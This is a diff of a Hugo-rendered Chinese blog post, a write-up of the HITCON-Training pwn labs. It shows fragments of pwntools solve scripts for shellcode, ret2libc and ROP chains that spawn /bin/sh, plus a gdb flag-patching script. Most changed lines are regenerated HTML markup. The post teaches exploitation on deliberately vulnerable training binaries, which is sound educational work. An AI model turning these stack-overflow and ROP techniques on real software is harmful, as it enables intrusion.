@@ -31,7 +31,7 @@
 
 
 
-<meta name="generator" content="Hugo 0.55.2" />
+<meta name="generator" content="Hugo 0.75.1" />
 
 
 <link rel="canonical" href="https://bash-c.github.io/post/hitcon-training-writeup/" />
@@ -60,16 +60,13 @@
 <meta property="og:description" content="HITCON-Training-Writeup 项目地址M4x&rsquo;s github，欢迎 star~ 复习一下二进制基础，写写 HITCON-Training 的 writeup，题目地址：https://github.co" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://bash-c.github.io/post/hitcon-training-writeup/" />
-<meta property="article:published_time" content="2018-07-02T12:05:10&#43;08:00"/>
-<meta property="article:modified_time" content="2018-07-02T12:05:10&#43;08:00"/>
-
+<meta property="article:published_time" content="2018-07-02T12:05:10+08:00" />
+<meta property="article:modified_time" content="2018-07-02T12:05:10+08:00" />
 <meta itemprop="name" content="HITCON-Training-Writeup">
 <meta itemprop="description" content="HITCON-Training-Writeup 项目地址M4x&rsquo;s github，欢迎 star~ 复习一下二进制基础，写写 HITCON-Training 的 writeup，题目地址：https://github.co">
-
-
-<meta itemprop="datePublished" content="2018-07-02T12:05:10&#43;08:00" />
-<meta itemprop="dateModified" content="2018-07-02T12:05:10&#43;08:00" />
-<meta itemprop="wordCount" content="9732">
+<meta itemprop="datePublished" content="2018-07-02T12:05:10+08:00" />
+<meta itemprop="dateModified" content="2018-07-02T12:05:10+08:00" />
+<meta itemprop="wordCount" content="9733">
 
 
 
@@ -316,7 +313,7 @@
             <a href="https://bash-c.github.io/categories/writeup/"> writeup </a>
             
           </div>
-        <span class="more-meta"> 9732 words </span>
+        <span class="more-meta"> 9733 words </span>
           <span class="more-meta"> 20 min read </span>
 
         
@@ -337,198 +334,224 @@
   <h2 class="post-toc-title">Table of Contents</h2>
   <div class="post-toc-content">
     <nav id="TableOfContents">
-<ul>
-<li><a href="#hitcon-training-writeup">HITCON-Training-Writeup</a>
-<ul>
-<li><a href="#outline">Outline</a></li>
-<li><a href="#writeup">Writeup</a>
-<ul>
-<li><a href="#lab1-sysmagic">lab1-sysmagic</a>
-<ul>
-<li><a href="#patch">patch</a></li>
-<li><a href="#调试">调试</a></li>
-</ul></li>
-<li><a href="#lab2-orw-bin">lab2-orw.bin</a></li>
-<li><a href="#lab3-ret2sc">lab3-ret2sc</a></li>
-<li><a href="#lab4-ret2lib">lab4-ret2lib</a></li>
-<li><a href="#lab5-simplerop">lab5-simplerop</a></li>
-<li><a href="#lab6-migration">lab6-migration</a></li>
-<li><a href="#lab7-crack">lab7-crack</a></li>
-<li><a href="#lab8-craxme">lab8-craxme</a></li>
-<li><a href="#lab9-playfmt">lab9-playfmt</a>
-<ul>
-<li><a href="#exp">exp</a></li>
-</ul></li>
-<li><a href="#lab10-hacknote">lab10-hacknote</a></li>
-<li><a href="#lab11-bamboobox">lab11-bamboobox</a>
-<ul>
-<li><a href="#house-of-force">house of force</a></li>
-<li><a href="#unlink">unlink</a></li>
-</ul></li>
-<li><a href="#lab12-secretgarden">lab12-secretgarden</a></li>
-<li><a href="#lab13-heapcreator">lab13-heapcreator</a></li>
-<li><a href="#lab14-magicheap">lab14-magicheap</a></li>
-<li><a href="#lab15-zoo">lab15-zoo</a></li>
-</ul></li>
-</ul></li>
-</ul>
+  <ul>
+    <li><a href="#outline">Outline</a></li>
+    <li><a href="#writeup">Writeup</a>
+      <ul>
+        <li><a href="#lab1-sysmagic">lab1-sysmagic</a></li>
+        <li><a href="#lab2-orwbin">lab2-orw.bin</a></li>
+        <li><a href="#lab3-ret2sc">lab3-ret2sc</a></li>
+        <li><a href="#lab4-ret2lib">lab4-ret2lib</a></li>
+        <li><a href="#lab5-simplerop">lab5-simplerop</a></li>
+        <li><a href="#lab6-migration">lab6-migration</a></li>
+        <li><a href="#lab7-crack">lab7-crack</a></li>
+        <li><a href="#lab8-craxme">lab8-craxme</a></li>
+        <li><a href="#lab9-playfmt">lab9-playfmt</a></li>
+        <li><a href="#lab10-hacknote">lab10-hacknote</a></li>
+        <li><a href="#lab11-bamboobox">lab11-bamboobox</a></li>
+        <li><a href="#lab12-secretgarden">lab12-secretgarden</a></li>
+        <li><a href="#lab13-heapcreator">lab13-heapcreator</a></li>
+        <li><a href="#lab14-magicheap">lab14-magicheap</a></li>
+        <li><a href="#lab15-zoo">lab15-zoo</a></li>
+      </ul>
+    </li>
+  </ul>
 </nav>
   </div>
 </div>
 
     
     <div class="post-content">
-      
-
-<h1 id="hitcon-training-writeup">HITCON-Training-Writeup</h1>
-
+      <h1 id="hitcon-training-writeup">HITCON-Training-Writeup</h1>
 <blockquote>
 <p>项目地址<a href="https://github.com/bash-c/HITCON-Training-Writeup">M4x&rsquo;s github</a>，欢迎 star~</p>
 </blockquote>
-
-<p>复习一下二进制基础，写写 HITCON-Training 的 writeup，题目地址：<a href="https://github.com/scwuaptx/HITCON-Training">https://github.com/scwuaptx/HITCON-Training</a></p>
-
+<p>复习一下二进制基础，写写 HITCON-Training 的 writeup，题目地址：https://github.com/scwuaptx/HITCON-Training</p>
 <h2 id="outline">Outline</h2>
-
 <ul>
 <li>Basic Knowledge
-
 <ul>
-<li>Introduction</li>
+<li>Introduction
+<ul>
 <li>Reverse Engineering
-
 <ul>
 <li>Static Analysis</li>
 <li>Dynamic Analysis</li>
-</ul></li>
+</ul>
+</li>
 <li>Exploitation</li>
 <li>Useful Tool
-
 <ul>
 <li>IDA PRO</li>
 <li>GDB</li>
 <li>Pwntool</li>
-</ul></li>
+</ul>
+</li>
 <li>lab 1 - sysmagic</li>
+</ul>
+</li>
 <li>Section</li>
 <li>Compile,linking,assmbler</li>
-<li>Execution</li>
+<li>Execution
+<ul>
 <li>how program get run</li>
 <li>Segment</li>
-<li>x86 assembly</li>
+</ul>
+</li>
+<li>x86 assembly
+<ul>
 <li>Calling convention</li>
 <li>lab 2 - open/read/write</li>
 <li>shellcoding</li>
-</ul></li>
+</ul>
+</li>
+</ul>
+</li>
 <li>Stack Overflow
-
 <ul>
 <li>Buffer Overflow</li>
-<li>Return to Text/Shellcode</li>
-<li>lab 3 - ret2shellcode</li>
-<li>Protection</li>
-<li>ASLR/DEP/PIE/StackGuard</li>
-<li>Lazy binding</li>
-<li>Return to Library</li>
-<li>lab 4 - ret2lib</li>
-</ul></li>
-<li>Return Oriented Programming
-
+<li>Return to Text/Shellcode
 <ul>
-<li>ROP</li>
+<li>lab 3 - ret2shellcode</li>
+</ul>
+</li>
+<li>Protection
+<ul>
+<li>ASLR/DEP/PIE/StackGuard</li>
+</ul>
+</li>
+<li>Lazy binding</li>
+<li>Return to Library
+<ul>
+<li>lab 4 - ret2lib</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Return Oriented Programming
+<ul>
+<li>ROP
+<ul>
 <li>lab 5 - simple rop</li>
-<li>Using ROP bypass ASLR</li>
+</ul>
+</li>
+<li>Using ROP bypass ASLR
+<ul>
 <li>ret2plt</li>
-<li>Stack migration</li>
+</ul>
+</li>
+<li>Stack migration
+<ul>
 <li>lab 6 - migration</li>
-</ul></li>
+</ul>
+</li>
+</ul>
+</li>
 <li>Format String Attack
-
 <ul>
 <li>Format String</li>
-<li>Read from arbitrary memory</li>
+<li>Read from arbitrary memory
+<ul>
 <li>lab 7 - crack</li>
-<li>Write to arbitrary memory</li>
+</ul>
+</li>
+<li>Write to arbitrary memory
+<ul>
 <li>lab 8 - craxme</li>
-<li>Advanced Trick</li>
+</ul>
+</li>
+<li>Advanced Trick
+<ul>
 <li>EBP chain</li>
 <li>lab 9 - playfmt</li>
-</ul></li>
+</ul>
+</li>
+</ul>
+</li>
 <li>x64 Binary Exploitation
-
 <ul>
 <li>x64 assembly</li>
 <li>ROP</li>
 <li>Format string Attack</li>
-</ul></li>
+</ul>
+</li>
 <li>Heap exploitation
-
 <ul>
 <li>Glibc memory allocator overview</li>
-<li>Vulnerablility on heap</li>
+<li>Vulnerablility on heap
+<ul>
 <li>Use after free
-
 <ul>
 <li>lab 10 - hacknote</li>
-</ul></li>
+</ul>
+</li>
 <li>Heap overflow
-
 <ul>
-<li>house of force</li>
+<li>house of force
+<ul>
 <li>lab 11 - 1 - bamboobox1</li>
-<li>unlink</li>
-<li>lab 11 - 2 - bamboobox2</li>
-</ul></li>
-</ul></li>
-<li>Advanced heap exploitation
-
+</ul>
+</li>
+<li>unlink
 <ul>
-<li>Fastbin attack</li>
+<li>lab 11 - 2 - bamboobox2</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Advanced heap exploitation
+<ul>
+<li>Fastbin attack
+<ul>
 <li>lab 12 - babysecretgarden</li>
+</ul>
+</li>
 <li>Shrink the chunk</li>
-<li>Extend the chunk</li>
+<li>Extend the chunk
+<ul>
 <li>lab 13 - heapcreator</li>
-<li>Unsortbin attack</li>
+</ul>
+</li>
+<li>Unsortbin attack
+<ul>
 <li>lab 14 - magicheap</li>
-</ul></li>
+</ul>
+</li>
+</ul>
+</li>
 <li>C++ Exploitation
-
 <ul>
 <li>Name Mangling</li>
 <li>Vtable fucntion table</li>
 <li>Vector &amp; String</li>
 <li>New &amp; delete</li>
-<li>Copy constructor &amp; assignment operator</li>
+<li>Copy constructor &amp; assignment operator
+<ul>
 <li>lab 15 - zoo</li>
-</ul></li>
 </ul>
-
+</li>
+</ul>
+</li>
+</ul>
 <h2 id="writeup">Writeup</h2>
-
 <h3 id="lab1-sysmagic">lab1-sysmagic</h3>
-
 <p>一个很简单的逆向题，看 get_flag 函数的逻辑逆回来即可，直接逆向的方法就不说了</p>
-
 <p>或者经过观察，flag 的生成与输入无关，因此可以通过 patch 或者调试直接获得 flag</p>
-
 <h4 id="patch">patch</h4>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fpcpmdngq8j30ja047dg7.jpg" alt="" /></p>
-
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fpcpmdngq8j30ja047dg7.jpg" alt=""></p>
 <p>修改关键判断即可，patch 后保存运行，输入任意值即可得 flag</p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fpcpmkyf79j30ez03emxy.jpg" alt="" /></p>
-
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fpcpmkyf79j30ez03emxy.jpg" alt=""></p>
 <h4 id="调试">调试</h4>
-
 <p>通过观察汇编，我们只需使下图的 cmp 满足即可，可以通过 gdb 调试，在调试过程中手动满足该条件</p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fpcpngmh9cj30f904gdfx.jpg" alt="" /></p>
-
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fpcpngmh9cj30f904gdfx.jpg" alt=""></p>
 <p>直接写出 gdb 脚本</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -543,21 +566,17 @@ r
 <span class="c1">#your input</span>
 <span class="nb">set</span> <span class="nv">$eax</span><span class="o">=</span><span class="nv">$edx</span>
 c
-lab1 <span class="o">[</span>master●●<span class="o">]</span> </code></pre></td></tr></table>
+lab1 <span class="o">[</span>master●●<span class="o">]</span> 
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>也可得到 flag</p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fpcpmxbneij30qu0c5dll.jpg" alt="" /></p>
-
+</div><p>也可得到 flag</p>
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fpcpmxbneij30qu0c5dll.jpg" alt=""></p>
 <p>同时注意，IDA 对字符串的识别出了问题，修复方法可以参考 inndy 的 <a href="http://www.cnblogs.com/WangAoBo/p/7706719.html"><strong>ROP2</strong></a></p>
-
-<h3 id="lab2-orw-bin">lab2-orw.bin</h3>
-
+<h3 id="lab2-orwbin">lab2-orw.bin</h3>
 <p>通过查看 prctl 的 man 手册发现该程序限制了一部分系统调用，根据题目的名字 open, read, write以及IDA分析，很明显是要我们自己写读取并打印 flag 的 shellcode 了，偷个懒，直接调用 shellcraft 模块</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -581,7 +600,7 @@ lab1 <span class="o">[</span>master●●<span class="o">]</span> </code></pre><
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-python" data-lang="python"><span class="n">lab2</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">solve</span><span class="o">.</span><span class="n">py</span> 
-<span class="ch">#!/usr/bin/env python</span>
+<span class="c1">#!/usr/bin/env python</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 <span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>
 
@@ -590,7 +609,7 @@ lab1 <span class="o">[</span>master●●<span class="o">]</span> </code></pre><
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>
 
 <span class="n">shellcode</span> <span class="o">=</span> <span class="n">sc</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s2">&#34;/home/m4x/HITCON-Training/LAB/lab2/testFlag&#34;</span><span class="p">)</span>
-<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">sc</span><span class="o">.</span><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;esp&#34;</span><span class="p">)</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">sc</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;esp&#34;</span><span class="p">)</span>
 <span class="c1">#  open返回的文件文件描述符存贮在eax寄存器里 </span>
 <span class="n">shellcode</span> <span class="o">+=</span> <span class="n">sc</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s2">&#34;eax&#34;</span><span class="p">,</span> <span class="s2">&#34;esp&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
 <span class="c1">#  open读取的内容放在栈顶 </span>
@@ -600,17 +619,15 @@ lab1 <span class="o">[</span>master●●<span class="o">]</span> </code></pre><
 <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;shellcode:&#34;</span><span class="p">,</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
 <span class="k">print</span> <span class="n">io</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
 <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-<span class="n">lab2</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> </code></pre></td></tr></table>
+<span class="n">lab2</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> 
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>该题与 pwnable.tw 的 orw 类似，那道题的 writeup 很多，因此就不说直接撸汇编的方法了</p>
-
+</div><p>该题与 pwnable.tw 的 orw 类似，那道题的 writeup 很多，因此就不说直接撸汇编的方法了</p>
 <h3 id="lab3-ret2sc">lab3-ret2sc</h3>
-
 <p>很简单的 ret2shellcode，程序没有开启 NX 和 canary 保护，把 shellcode 存贮在 name 这个全局变量上，并 ret 到该地址即可</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -632,7 +649,7 @@ lab1 <span class="o">[</span>master●●<span class="o">]</span> </code></pre><
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-python" data-lang="python"><span class="n">lab3</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">solve</span><span class="o">.</span><span class="n">py</span> 
-<span class="ch">#!/usr/bin/env python</span>
+<span class="c1">#!/usr/bin/env python</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 <span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>
 
@@ -649,21 +666,17 @@ lab1 <span class="o">[</span>master●●<span class="o">]</span> </code></pre><
 
 <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-<span class="n">lab3</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> </code></pre></td></tr></table>
+<span class="n">lab3</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> 
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>需要注意的是，该程序中的 read 是通过 esp 寻址的，因此具体的 offset 可以通过调试查看</p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fpcpljuki5j30g702wdfy.jpg" alt="" /></p>
-
+</div><p>需要注意的是，该程序中的 read 是通过 esp 寻址的，因此具体的 offset 可以通过调试查看</p>
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fpcpljuki5j30g702wdfy.jpg" alt=""></p>
 <p>也可以通过 peda 的 pattern_offset/pattern_search , pwntools 的 cyclic/cyclic -l 等工具来找 offset</p>
-
 <h3 id="lab4-ret2lib">lab4-ret2lib</h3>
-
-<p>ret2libc，并且程序中已经有了一个可以查看 got 表中值的函数 See_something，直接 leak 出 libc 基址，通过 one_gadget 或者 system(&ldquo;/bin/sh&rdquo;) 都可以 get shell，/bin/sh 可以使用 libc 中的字符串，可以通过 read 读入到内存中，也可以使用 binary 中的字符串</p>
+<p>ret2libc，并且程序中已经有了一个可以查看 got 表中值的函数 See_something，直接 leak 出 libc 基址，通过 one_gadget 或者 system(&quot;/bin/sh&quot;) 都可以 get shell，/bin/sh 可以使用 libc 中的字符串，可以通过 read 读入到内存中，也可以使用 binary 中的字符串</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -691,7 +704,7 @@ lab1 <span class="o">[</span>master●●<span class="o">]</span> </code></pre><
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-python" data-lang="python"><span class="n">lab4</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">solve</span><span class="o">.</span><span class="n">py</span> 
-<span class="ch">#!/usr/bin/env python</span>
+<span class="c1">#!/usr/bin/env python</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 <span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>
 
@@ -714,23 +727,19 @@ lab1 <span class="o">[</span>master●●<span class="o">]</span> </code></pre><
 
 <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-<span class="n">lab4</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> </code></pre></td></tr></table>
+<span class="n">lab4</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> 
+</code></pre></td></tr></table>
 </div>
-</div>
-<h3 id="lab5-simplerop">lab5-simplerop</h3>
-
+</div><h3 id="lab5-simplerop">lab5-simplerop</h3>
 <p>本来看程序是静态链接的，想通过 ROPgadget/ropper 等工具生成的 ropchain 一波带走，但实际操作时发现 read 函数只允许读入 100 个字符，去除 buf 到 main 函数返回地址的偏移为 32，我们一共有 100 - 32 = 68 的长度来构造 ropchain，而 ropper/ROPgadget 等自动生成的 ropchain 都大于这个长度，这就需要我们精心设计 ropchain 了，这里偷个懒，优化一下 ropper 生成的 ropchain 来缩短长度</p>
-
 <blockquote>
 <p>ropper &ndash;file ./simplerop &ndash;chain &ldquo;execve cmd=/bin/sh&rdquo;</p>
-
 <p>ROPgadget &ndash;binary ./simplerop &ndash;ropchain</p>
 </blockquote>
-
 <p>先看一下 ropper 生成的 ropchain</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -805,16 +814,17 @@ lab1 <span class="o">[</span>master●●<span class="o">]</span> </code></pre><
 <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0000000b</span><span class="p">)</span>
 <span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x00026ef0</span><span class="p">)</span> <span class="c1"># 0x0806eef0: int 0x80; ret; </span>
 <span class="k">print</span> <span class="n">rop</span>
-<span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">rop</span> <span class="n">chain</span> <span class="n">generated</span><span class="err">!</span></code></pre></td></tr></table>
+<span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">rop</span> <span class="n">chain</span> <span class="n">generated</span><span class="err">!</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>简单介绍一下原理，通过一系列 pop|ret 等gadget，使得 eax = 0xb（execve 32 位下的系统调用号），ebx -&gt; /bin/sh， ecx = edx = 0，然后通过 <code>int 0x80</code> 实现系统调用，执行 execve(&ldquo;/bin/sh&rdquo;, 0, 0)，实际上构造了一个 ret2syscall 的rop chain, hackme.inndy 上也有一道类似的题目<a href="http://www.cnblogs.com/WangAoBo/p/7706719.html#_label3"><strong>ROP2</strong></a>
-&gt; ret2syscall 的更多细节可以参考 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/basic_rop/#ret2syscall">ctf-wiki</a></p>
-
+</div><p>简单介绍一下原理，通过一系列 pop|ret 等gadget，使得 eax = 0xb（execve 32 位下的系统调用号），ebx -&gt; /bin/sh， ecx = edx = 0，然后通过 <code>int 0x80</code> 实现系统调用，执行 execve(&quot;/bin/sh&quot;, 0, 0)，实际上构造了一个 ret2syscall 的rop chain, hackme.inndy 上也有一道类似的题目<a href="http://www.cnblogs.com/WangAoBo/p/7706719.html#_label3"><strong>ROP2</strong></a></p>
+<blockquote>
+<p>ret2syscall 的更多细节可以参考 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/basic_rop/#ret2syscall">ctf-wiki</a></p>
+</blockquote>
 <p>而当观察 ropper 等工具自动生成的 ropchain 时，会发现有很多步骤是很繁琐的，可以做出很多优化，给一个优化后的例子</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -915,19 +925,17 @@ lab1 <span class="o">[</span>master●●<span class="o">]</span> </code></pre><
 <span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x00072e06</span><span class="p">)</span> <span class="c1"># 0x080bae06: pop eax; ret; </span>
 <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0000000b</span><span class="p">)</span>
 <span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x00026ef0</span><span class="p">)</span> <span class="c1"># 0x0806eef0: int 0x80; ret; </span>
-<span class="n">asset</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">100</span> <span class="o">-</span> <span class="mi">32</span></code></pre></td></tr></table>
+<span class="n">asset</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">100</span> <span class="o">-</span> <span class="mi">32</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>注释都已经写在代码里了，主要优化了将 /bin/sh\x00 读入以及设置 ebx，ecx，edx 等寄存器的过程</p>
-
+</div><p>注释都已经写在代码里了，主要优化了将 /bin/sh\x00 读入以及设置 ebx，ecx，edx 等寄存器的过程</p>
 <blockquote>
 <p>或者直接 return 到 read 函数，将 /bin/sh\x00 read 到 bss/data 段，能得到更短的 ropchain, 解决方法有很多,不再细说</p>
 </blockquote>
-
 <p>最终脚本:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -992,7 +1000,7 @@ lab1 <span class="o">[</span>master●●<span class="o">]</span> </code></pre><
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-python" data-lang="python"><span class="n">lab5</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">solve</span><span class="o">.</span><span class="n">py</span> 
-<span class="ch">#!/usr/bin/env python</span>
+<span class="c1">#!/usr/bin/env python</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 <span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>
 
@@ -1052,39 +1060,39 @@ lab1 <span class="o">[</span>master●●<span class="o">]</span> </code></pre><
 <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; :&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 
 <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></td></tr></table>
+<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<h3 id="lab6-migration">lab6-migration</h3>
-
+</div><h3 id="lab6-migration">lab6-migration</h3>
 <p>栈迁移的问题，可以看出这个题目比起暴力的栈溢出做了两点限制：</p>
-
 <ul>
-<li><p>每次溢出只有 0x40-0x28-0x4=<strong>20</strong> 个字节的长度可以构造 ropchain</p></li>
-
-<li><p>通过</p></li>
-</ul>
+<li>
+<p>每次溢出只有 0x40-0x28-0x4=<strong>20</strong> 个字节的长度可以构造 ropchain</p>
+</li>
+<li>
+<p>通过</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C">    <span class="k">if</span> <span class="p">(</span> <span class="n">count</span> <span class="o">!=</span> <span class="mi">1337</span> <span class="p">)</span>
-      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span></code></pre></td></tr></table>
+<pre class="chroma"><code class="language-C" data-lang="C">  <span class="k">if</span> <span class="p">(</span> <span class="n">count</span> <span class="o">!=</span> <span class="mi">1337</span> <span class="p">)</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</code></pre></td></tr></table>
 </div>
-</div>
+</div></li>
+</ul>
 <p>限制了我们只能利用一次 main 函数的溢出（如果能 leak 出栈地址的话, 可以在栈上构造 rop chain 并控制返回地址 ret 到栈上的 rop chain)</p>
-
-<p>所以我们就只能通过 20 个字节的 ropchain 来进行 rop 了，关于栈迁移（又称为 stack-pivot）可以看这个 <a href="https://github.com/M4xW4n9/slides/blob/master/pwn_stack/DEP%20%26%20ROP.pdf%0A"><strong>slide</strong></a>
-&gt; <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/others/#stack-pivoting">ctf-wiki</a> 上对 stack pivot 也有较为详细的介绍</p>
-
-<p><img src="https://raw.githubusercontent.com/M4xW4n9/slides/master/pwn_stack/stackPivot.jpg" alt="stackPivot" /></p>
-
+<p>所以我们就只能通过 20 个字节的 ropchain 来进行 rop 了，关于栈迁移（又称为 stack-pivot）可以看这个 <a href="https://github.com/M4xW4n9/slides/blob/master/pwn_stack/DEP%20%26%20ROP.pdf%0A"><strong>slide</strong></a></p>
+<blockquote>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/others/#stack-pivoting">ctf-wiki</a> 上对 stack pivot 也有较为详细的介绍</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/M4xW4n9/slides/master/pwn_stack/stackPivot.jpg" alt="stackPivot"></p>
 <p>我的exp：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1135,7 +1143,7 @@ lab1 <span class="o">[</span>master●●<span class="o">]</span> </code></pre><
 </span></code></pre></td>
 <td class="lntd">
